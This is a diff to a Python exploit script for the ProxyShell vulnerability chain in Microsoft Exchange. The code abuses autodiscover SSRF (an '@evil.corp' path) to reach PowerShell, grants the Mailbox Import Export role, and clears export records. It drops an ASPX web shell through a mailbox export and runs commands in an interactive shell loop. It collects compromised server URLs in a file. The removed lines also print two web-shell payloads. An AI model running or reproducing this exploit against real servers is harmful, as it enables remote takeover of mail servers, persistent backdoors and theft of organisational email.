@@ -239,14 +239,12 @@ class ProxyShell:
 
 def exploit(proxyshell):
     proxyshell.get_legacydn()
-    print(f'legacyDN {proxyshell.legacydn}')
-
+    proxyshell.get_token()
     proxyshell.get_sid()
+    print(f'legacyDN {proxyshell.legacydn}')
     print(f'leak_sid {proxyshell.sid}')
     print(f'admin_sid {proxyshell.admin_sid}')
-    proxyshell.get_token()
     print(f'powershell_token {proxyshell.token}')
-
     print('set_ews ' + str(proxyshell.set_ews()))
 
 def start_server(proxyshell, port):
@@ -266,12 +264,6 @@ def shell(command, port):
         ps = PowerShell(pool)
         ps.add_script(command)
         output = ps.invoke()
-    # o = "%s" % "".join([str(s) for s in output])
-    # e = "%s" % "".join([str(s) for s in ps.streams.error])
-    # if o:
-    #     print("%s" % "".join([str(s) for s in output]))
-    # if e:
-    #     print("%s" % "".join([str(s) for s in ps.streams.error]))
 
 def get_fqdn(exchange_url):
     e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
@@ -303,7 +295,6 @@ def check_mail(exchange_url, fqdn, files):
             pass
         elif "<ErrorCode>" not in autodiscover_req.text:
             email = c_mail
-            #print(autodiscover_req.text)
             if autodiscover_req.text == "":
                 print("(-) " +exchange_url)
                 exit()
@@ -327,7 +318,7 @@ def exec_cmd(shell_url, code="exec_code"):
             print(req_test.text.split('!BD')[0].split('\n')[0])
             while True:
                 cmd = input("SHELL> ")
-                if cmd.lower() == 'exit':
+                if cmd.lower() in ['exit', 'quit']:
                 	exit(0)
                 shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
                 shell_req = requests.post(shell_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
@@ -356,7 +347,6 @@ def main():
     exchange_url = "https://" + args.t
     fqdn = get_fqdn(exchange_url)
     print("fqdn " + fqdn)
-    #print("date " + x)
     email = ''
     if "administrator@domain.local" not in args.e:
         email = args.e
@@ -386,32 +376,16 @@ def main():
     #shell_path = f"\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\"+file_name
     print("set role import/export to user " + email.split('@')[0])
     shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{uname}"', local_port)
-    #time.sleep(3)
     print("clear all mailboxexport record")
     shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', local_port)
-    #time.sleep(3)
     print("write shell " + file_name)
     shell(f'New-MailboxExportRequest -Mailbox {email} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'{subj_}\')" -ExcludeDumpster -FilePath "{shell_path}"', local_port)
     time.sleep(5)
-    #shell('New-ExchangeCertificate -GenerateRequest -RequestFile "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\shell.aspx" -SubjectName "cn=<%@ Page Language=\'VB\' Debug=\'true\' %>`r`n<%@ import Namespace=\'system.IO\' %>`r`n<%@ import Namespace=\'System.Diagnostics\' %>`r`n`r`n<script runat=\'server\'>      `r`nSub RunCmd()            `r`n  Dim myProcess As New Process()            `r`n  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            `r`n  myProcessStartInfo.UseShellExecute = false            `r`n  myProcessStartInfo.RedirectStandardOutput = true            `r`n  myProcess.StartInfo = myProcessStartInfo            `r`n  myProcessStartInfo.Arguments=xcmd.text            `r`n  myProcess.Start()            `r`n  Dim myStreamReader As StreamReader = myProcess.StandardOutput            `r`n  Dim myString As String = myStreamReader.Readtoend()            `r`n  myProcess.Close()                       `r`n  result.text= vbcrlf & mystring  `r`nEnd Sub`r`n</script>`r`n`r`n<html>`r`n<body>    `r`n<form runat=\'server\'>        `r`n<p><asp:Label id=\'L_p\' runat=\'server\' width=\'80px\'>Program</asp:Label>        `r`n<asp:TextBox id=\'xpath\' runat=\'server\' Width=\'300px\'>c:\\windows\\system32\\cmd.exe</asp:TextBox>        `r`n<p><asp:Label id=\'L_a\' runat=\'server\' width=\'80px\'>Arguments</asp:Label>        `r`n<asp:TextBox id=\'xcmd\' runat=\'server\' Width=\'300px\' Text=\'/c whoami\'>/c whoami</asp:TextBox>        `r`n<p><asp:Button id=\'Button\' onclick=\'runcmd\' runat=\'server\' Width=\'100px\' Text=\'Run\'></asp:Button>        `r`n<p><asp:Label id=\'result\' runat=\'server\'></asp:Label>       `r`n</form>`r`n</body>`r`n</html><!--" -BinaryEncoded:$true -DomainName example.org', local_port)
-    #print("(+) Try write shell to " + exchange_url + '/owa/auth/' + file_name)
-    #time.sleep(20)
     shell_url = f"{exchange_url}{path}{file_name}"
     print(f"path shell at {shell_url}")
     for i in range(0, 10):
         f = requests.get(f"{shell_url}", verify=False)
-        #echo \"<script language='JScript' runat='server'> function Page_Load(){ eval(Request['teemo'],'unsafe');Response.End; } </script>\" > C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx
-        # w_clearshell = "echo \"<script language='JScript' runat='server'> function Page_Load(){ eval(Request['teemo'],'unsafe');Response.End; } </script>\" > C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"
-        # exec_code = f'Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c "{w_clearshell}"").stdout.readall());'
-        # r_clear = requests.get(
-        #     shell_url,
-        #     params={
-        #         "exec_code": exec_code
-        #     },
-        #     verify=False
-        # )
         if f.status_code == 200:
-            #csurl =  f"{exchange_url}{path}shell.aspx"
             print(f"got shell {f}")
             with open('good.txt', 'a+') as files:
                 files.write(f"{shell_url}\n")
